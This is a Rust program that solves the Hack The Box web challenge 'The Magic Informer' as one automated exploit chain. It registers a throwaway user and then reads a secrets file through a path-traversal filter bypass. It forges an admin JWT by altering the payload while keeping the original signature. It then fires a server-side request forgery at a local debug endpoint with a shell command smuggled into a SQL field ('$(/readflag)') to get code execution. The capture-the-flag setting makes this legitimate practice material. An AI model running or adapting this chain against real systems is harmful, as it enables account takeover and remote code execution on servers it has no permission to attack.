use clap::Parser;
use reqwest::blocking::Client;
use reqwest::header::{COOKIE,SET_COOKIE};
use serde::Serialize;
use rand::{distributions::Alphanumeric, Rng};
use cookie::Cookie;
use base64::{engine::general_purpose, Engine as _};


#[derive(Parser, Debug)]
#[command(version, about = "Solves Hack The Box - The Magic Informer (web, easy)", long_about = None)]
struct Cli {
    #[arg(short = 'u', long = "target_url")]
    target_url: String,
}

#[derive(Serialize)]
struct UserCredentials<'a> {
    username: &'a str,
    password: &'a str,
}

#[derive(Serialize)]
struct ExecPayload<'a> {
    sql: &'a str,
    password: &'a str,
}

#[derive(Serialize)]
struct SsrfPayload<'a> {
    verb: &'a str,
    url: &'a str,
    params: ExecPayload<'a>,
    headers: &'a str,
    resp_ok: &'a str,
    resp_bad: &'a str,
}


fn main() {
    let cli = Cli::parse();
    let target_url = cli.target_url;

    let user_credentials = UserCredentials {
        username: &generate_random_string(8),
        password: &generate_random_string(8),
    };

    let register_url = format!("{}/api/register", target_url);

    println!("Registering user at: {}", register_url);

    let client = Client::new();
    let response = client
        .post(register_url)
        .json(&user_credentials)
        .send()
        .unwrap();


    let resp_status = response.status();
    let body = response.text().unwrap();

    let status = format!("{}", resp_status);

    if status != "200 OK" {
        let failure_message = format!("Registering user failed - body: {}", body);
        panic!("{}", failure_message);
    }

    println!("Successfully registered user.");

    let login_url = format!("{}/api/login", target_url);

    println!("Logging in user and extracting session cookie.");

    let client = Client::new();
    let response = client
        .post(login_url)
        .json(&user_credentials)
        .send()
        .unwrap();

    let resp_status = response.status();

    let status = format!("{}", resp_status);

    if status != "200 OK" {
        let failure_message = format!("Registering user failed - body: {}", body);
        panic!("{}", failure_message);
    }

    let cookies = response.headers().get_all(SET_COOKIE);

    let mut jwt_session_cookie_option: Option<String> = None;
    let mut jwt_session_cookie_value_option: Option<String> = None;

    for cookie_header in cookies {
        if let Ok(cookie_str) = cookie_header.to_str() {
            if let Ok(cookie) = Cookie::parse(cookie_str) {
                if cookie.name() == "session" {
                    let cookie_value = format!("session={}", cookie.value().to_string());
                    jwt_session_cookie_option = Some(cookie_value);
                    jwt_session_cookie_value_option = Some(cookie.value().to_string());
                    break; 
                }
            }
        }
    }

    let jwt_session_cookie = jwt_session_cookie_option.unwrap();
    let jwt_session_cookie_value = jwt_session_cookie_value_option.unwrap();

    println!("Successfully extracted session cookie");
    //---Steal DEBUG env
    println!("Stealing DEBUG_PASS variable via path traversal on /download endpoint");
    let debug_pass_body = exploit_path_traversal(&target_url, "../debug.env", &jwt_session_cookie);
    let debug_pass_helper = Cookie::parse(debug_pass_body).unwrap(); //not the intended usage for
                                                                     //Cookie::parse but works
    let debug_pass = debug_pass_helper.value();

    //---Forge jwt token to admin
    println!("Forging admin JWT token");
    let header_b64 = jwt_session_cookie_value.split('.').nth(0).unwrap();
    let payload_b64 = jwt_session_cookie_value.split('.').nth(1).unwrap();
    let signage_b64 = jwt_session_cookie_value.split('.').nth(2).unwrap();

    let decoded_bytes = general_purpose::URL_SAFE_NO_PAD.decode(payload_b64).unwrap();

    let payload_json = String::from_utf8(decoded_bytes).unwrap();
    let payload_json_admin = payload_json.replace(user_credentials.username,"admin");

    //only works if the `==` gets dropped
    let encoded_admin_payload = general_purpose::STANDARD.encode(payload_json_admin).replace("==","");

    let session_cookie_admin = format!("session={}.{}.{}", header_b64, encoded_admin_payload, signage_b64);

    //---Perform SSRF to RCE and get flag
    println!("Preparing SSRF Payload");

    let verb = "POST";
    let url = format!("http://127.0.0.1:1337/debug/sql/exec");
    let params = ExecPayload {
        sql: "SELECT '$(/readflag)'",
        password: debug_pass,
    };
    let headers = format!("Cookie: {}", session_cookie_admin);

    let resp_ok = "NA";
    let resp_bad = "NA";

    let ssrf_payload = SsrfPayload {
        verb: verb,
        url: &url,
        params: params,
        headers: &headers,
        resp_ok: resp_ok,
        resp_bad: resp_bad,
    };

    let exec_url = format!("{}/api/sms/test", target_url);

    println!("Firing payload to target");

    let client = Client::new();
    let response = client
        .post(exec_url)
        .header(COOKIE, session_cookie_admin)
        .json(&ssrf_payload)
        .send()
        .unwrap();

    let body = response.text().unwrap();
    let body_parsed: serde_json::Value = serde_json::from_str(&body).unwrap();

    let inner_json_str = body_parsed["result"].as_str().unwrap();
    let inner_json: serde_json::Value = serde_json::from_str(inner_json_str).unwrap();
    let flag = inner_json["output"].as_str().unwrap() ;

    println!("\nFlag: \n{}", flag);
}

fn generate_random_string(len: usize) -> String {
    let random_string: String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(len) 
        .map(char::from)
        .collect();
    return random_string;
}

fn exploit_path_traversal(target_url: &str, relative_path: &str, jwt_session_cookie: &str) -> String {
    let tampered_path = relative_path.replace("../", "....//"); //gets re-replaced by server
    let download_url = format!("{}/download?resume={}", target_url, tampered_path);

    let client = Client::new();
    let response = client
        .get(download_url)
        .header(COOKIE, jwt_session_cookie)
        .send()
        .unwrap();

    let body = response.text().unwrap();
    return body;
}
